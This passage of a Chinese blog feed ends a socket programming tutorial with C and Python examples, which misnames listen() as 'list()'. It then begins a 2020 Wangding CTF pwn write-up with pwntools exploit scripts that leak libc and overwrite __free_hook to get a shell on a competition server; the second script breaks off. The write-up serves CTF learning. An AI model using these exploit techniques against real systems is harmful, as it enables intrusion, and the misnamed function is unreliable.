class="comment">/* IPv6 address */</span> </span><br><span class="line">    <span class="keyword">uint32_t</span>        sin6_scope_id; <span class="comment">/* Scope ID (new in 2.4) */</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> &#123;</span> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   s6_addr[<span class="number">16</span>];   <span class="comment">/* IPv6 address */</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Unix域对应的是： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNIX_PATH_MAX    108</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> &#123;</span> </span><br><span class="line">    <span class="keyword">sa_family_t</span> sun_family;               <span class="comment">/* AF_UNIX */</span> </span><br><span class="line">    <span class="keyword">char</span>        sun_path[UNIX_PATH_MAX];  <span class="comment">/* pathname */</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>addrlen：对应的是地址的长度。</p></li></ul><h3 id="list-、connect-函数"><a href="#list-、connect-函数" class="headerlink" title="list()、connect()函数"></a>list()、connect()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>list()函数用于服务器端侦听端口。</p><p>connect()函数用于客户端向服务器端发送连接请求。</p><h3 id="accept-函数"><a href="#accept-函数" class="headerlink" title="accept()函数"></a>accept()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;<span class="comment">//返回connect_fd</span></span><br></pre></td></tr></table></figure><p>该函数用于服务器端在list()之后接收请求，其中第二个参数addr用来接收返回值，返回值指向客户端地址。</p><p>注：accept默认会阻塞进程，直到有一个客户连接建立后返回。</p><h3 id="读写操作函数"><a href="#读写操作函数" class="headerlink" title="读写操作函数"></a>读写操作函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">send</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recv</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendto</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags, <span class="keyword">const</span> struct sockaddr *dest_addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvfrom</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags, struct sockaddr *src_addr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendmsg</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvmsg</span><span class="params">(<span class="keyword">int</span> sockfd, struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>这些函数用于接收和发送数据，不一一介绍，具体看man文档。</p><h3 id="close-函数"><a href="#close-函数" class="headerlink" title="close()函数"></a>close()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure><p>该函数用于关闭连接。</p><p>注：close操作只是使用相应socket描述字的引用计数减1，只有当引用计数为0时，才会触发TCP客户端向服务器发送终止连接请求。</p><h2 id="socket中TCP的建立"><a href="#socket中TCP的建立" class="headerlink" title="socket中TCP的建立"></a>socket中TCP的建立</h2><p>TCP协议通过三个报文段完成连接的建立，即三次握手：</p><ul><li>第一次握手：建立连接时，客户端发送syn包到服务器，并进入SYN_SEND状态，等待服务器确认。（SYN：同步序列编号）</li><li>第二次握手：服务器收到syn包，必须确认客户的SYN，同时自己也发送一个SYN包，即SYN+ACK包，此时服务器进入SYN_RECV状态。</li><li>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。</li></ul><h2 id="TCP连接的终止"><a href="#TCP连接的终止" class="headerlink" title="TCP连接的终止"></a>TCP连接的终止</h2><p>终止一个连接要经过四次握手，这是由TCP的半关闭造成的。</p><ol><li>客户端发送一个FIN，用来关闭客户端到服务器端的数据传送。</li><li>服务器端收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。</li><li>服务器端关闭与客户端的连接，发送一个FIN给客户端。</li><li>客户端发回ACK报文确认，并将确认序号设置为收到序号加1。</li></ol><h2 id="socket编程实例"><a href="#socket编程实例" class="headerlink" title="socket编程实例"></a>socket编程实例</h2><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><h4 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 4096</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> socket_fd, connect_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZE];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">if</span>( (socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>) ) == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"create socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;servaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(servaddr) );</span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">servaddr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">servaddr.sin_port = htons(<span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(bind(socket_fd, (struct sockaddr*)&amp;servaddr, <span class="keyword">sizeof</span>(servaddr)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bind socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">listen</span>(socket_fd, <span class="number">10</span>) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"listen socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=====wait for connect====\n"</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>( (connect_fd = accept(socket_fd, (struct sockaddr*)<span class="literal">NULL</span>, <span class="literal">NULL</span>) ) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"accept socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n = recv(connect_fd, buf, BUFSIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!fork())&#123;</span><br><span class="line"><span class="keyword">if</span>(send(connect_fd, <span class="string">"Hello, you are connect"</span>, <span class="number">27</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">perror(<span class="string">"send_error"</span>);</span><br><span class="line"><span class="built_in">close</span>(connect_fd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf[n] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you have recv msg: %s\n"</span>,buf);</span><br><span class="line"><span class="built_in">close</span>(connect_fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(socket_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> socket_fd, n, rec_len;</span><br><span class="line"><span class="keyword">char</span> sendline[BUFSIZE];</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"usage: ./client &lt;ipaddress&gt;"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>) ) &lt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"create socket error: %s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;servaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">servaddr.sin_port = htons(<span class="number">8000</span>);</span><br><span class="line"><span class="keyword">if</span>( inet_pton(AF_INET, argv[<span class="number">1</span>], &amp;servaddr.sin_addr) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"inet_pton error for %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">connect</span>(socket_fd, (struct sockaddr*)&amp;servaddr, <span class="keyword">sizeof</span>(servaddr) ) &lt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connect socket error: %s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"send msg to server: \n"</span>);</span><br><span class="line">fgets(sendline, BUFSIZE, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span>(send(socket_fd, sendline, <span class="built_in">strlen</span>(sendline), <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"send msg error:%s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (rec_len = recv(socket_fd, buf, BUFSIZE, <span class="number">0</span>) ) == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"recv msg error:%s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">buf[rec_len] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Recvived : %s\n"</span>, buf);</span><br><span class="line"><span class="built_in">close</span>(socket_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><h4 id="服务器端-1"><a href="#服务器端-1" class="headerlink" title="服务器端"></a>服务器端</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket()</span><br><span class="line">host = socket.gethostname()</span><br><span class="line">port = <span class="number">8000</span></span><br><span class="line">s.bind((host, port))</span><br><span class="line"></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">c,addr = s.accept()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'address'</span>,addr</span><br><span class="line">msg = <span class="string">"welcome to my service. \nif you want to exit, please input exit."</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">c.send(msg)</span><br><span class="line">buf = c.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'exit'</span> <span class="keyword">in</span> buf:</span><br><span class="line">c.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">msg = <span class="string">"you have input: "</span>+buf</span><br></pre></td></tr></table></figure><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s = socket.socket()</span><br><span class="line">host = socket.gethostname()</span><br><span class="line">port = <span class="number">8000</span></span><br><span class="line">s.connect((host, port))</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">buf = sys.stdin.readline()</span><br><span class="line">s.send(buf)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'exit'</span> <span class="keyword">in</span> buf:</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>Linux的SOCKET编程详解 - 江召伟 - 博客园  <a href="https://www.cnblogs.com/jiangzhaowei/p/8261174.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiangzhaowei/p/8261174.html</a></p><p>Python 网络编程 | 菜鸟教程  <a href="https://www.runoob.com/python/python-socket.html" target="_blank" rel="noopener">https://www.runoob.com/python/python-socket.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h2&gt;&lt;p&gt;网络进程标识：ip地址，协议，端口。&lt;/p&gt;
&lt;p&gt;TCP/IP是传输控制协议/网间协议。&lt;/p&gt;
&lt;p&gt;TCP/IP协议存
      
    
    </summary>
    
    
      <category term="编程" scheme="https://nuoye-blog.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="https://nuoye-blog.github.io/tags/python/"/>
    
      <category term="socket" scheme="https://nuoye-blog.github.io/tags/socket/"/>
    
      <category term="c" scheme="https://nuoye-blog.github.io/tags/c/"/>
    
      <category term="编程" scheme="https://nuoye-blog.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎青龙组pwn-wp</title>
    <link href="https://nuoye-blog.github.io/2020/05/19/wp/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84pwn-wp/"/>
    <id>https://nuoye-blog.github.io/2020/05/19/wp/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84pwn-wp/</id>
    <published>2020-05-19T03:55:00.000Z</published>
    <updated>2020-05-19T03:54:24.402Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="boom1"><a href="#boom1" class="headerlink" title="boom1"></a>boom1</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>一个语义分析的程序，好像是c4编译器（不清楚不了解，毕竟没有上过半节计算机的课），栈、text、symbol都存放在malloc出来的几块大内存上，可以定义全局变量和局部变量，局部变量存在栈上。通过局部变量leak出栈地址，再接着leak libc基地址，最后修改free_hook为onegadget一把梭。在（PS：这里已经有libc地址并且能任意写了，所以还有一大堆的利用方式，都可以用）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">p &#x3D; remote(&quot;182.92.73.10&quot;,24573)</span><br><span class="line">#gdb.attach(p,&#39;b free&#39;)</span><br><span class="line">p.sendline(&#39;&#39;&#39;</span><br><span class="line">libc;</span><br><span class="line">*ptr;</span><br><span class="line">*stack;</span><br><span class="line">chunk;</span><br><span class="line">main()&#123;</span><br><span class="line">void *add;</span><br><span class="line">add &#x3D; &amp;add;</span><br><span class="line">stack &#x3D; add + 0x18;</span><br><span class="line">stack &#x3D; *stack;</span><br><span class="line">stack &#x3D; stack -29;</span><br><span class="line">libc &#x3D; *stack -0x20830;</span><br><span class="line">ptr &#x3D; libc+0x3c67a8;</span><br><span class="line">*ptr &#x3D; libc+0x4526a;</span><br><span class="line">free(chunk);</span><br><span class="line">&#125;</span><br><span class="line">&#39;&#39;&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="boom2"><a href="#boom2" class="headerlink" title="boom2"></a>boom2</h2><p>vmpwn题，实现了几个汇编指令，不过一大堆没用的。思路：首先获得指向libc_start_main+240的指针，并且push进栈以保存，然后通过add等指令计算出onegadget地址，再通过前面保存的指针覆写返回地址，最后getshell。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p = remote(<span class="string">'182.92.73.10'</span>, <span class="number">36642</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack_base</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">13</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">26</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">imm</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">n += <span class="number">1</span> &lt;&lt; <span class="number">64</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">9</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wm</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">11</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> 